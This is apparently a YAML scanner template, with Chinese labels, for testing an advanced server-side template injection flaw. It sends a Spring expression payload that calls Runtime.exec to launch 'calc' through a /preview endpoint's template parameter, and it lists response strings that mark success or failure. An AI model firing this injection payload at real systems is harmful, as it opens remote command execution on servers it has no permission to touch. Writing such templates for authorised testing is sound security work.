name: 服务器端模板注入(SSTI)高级测试
description: 测试高级服务器端模板注入漏洞
level: 高
author: Test
request:
  method: GET
  path: /preview
  params:
    template: "${T(java.lang.Runtime).getRuntime().exec('calc')}"
    format: "html"
  headers:
    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
response:
  matchType: contains
  successIndicators:
    - "preview generated"
    - "预览已生成"
  errorIndicators:
    - "invalid template"
    - "template error"
    - "模板错误"
  statusCode: 200